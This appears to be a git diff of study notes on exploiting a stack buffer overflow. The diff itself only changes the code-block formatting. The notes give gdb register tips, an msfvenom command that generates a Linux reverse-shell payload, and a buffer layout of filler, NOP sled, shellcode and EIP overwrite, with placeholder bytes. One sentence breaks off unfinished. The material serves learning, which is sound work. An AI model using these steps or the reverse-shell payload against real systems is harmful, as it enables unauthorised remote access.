@@ -9,12 +9,12 @@
 - To find exact memory addressess use `info registers <your-register>` ebp is the beginning of the stack, eip is what we seek to execute code by pointing to a new memory register.
 - Next onto generating shellcode via metasploit: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c` by default this will be some small amount of memory, however 
 - In order for this code to execute we will need to calculate exactly where to put it into the buffer, it is preferable to put it at the end of the buffer and then overwrite the eip which will store our code safely, better to have more than less so we over guess how many bytes the shellcode will take up in memory.
-`
+```
    Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
      NOPs = "\x90" * 100
 Shellcode = "\x44" * 150
       EIP = "\x66" * 4
-`
+```
 
 
 ## Register Cheatsheet
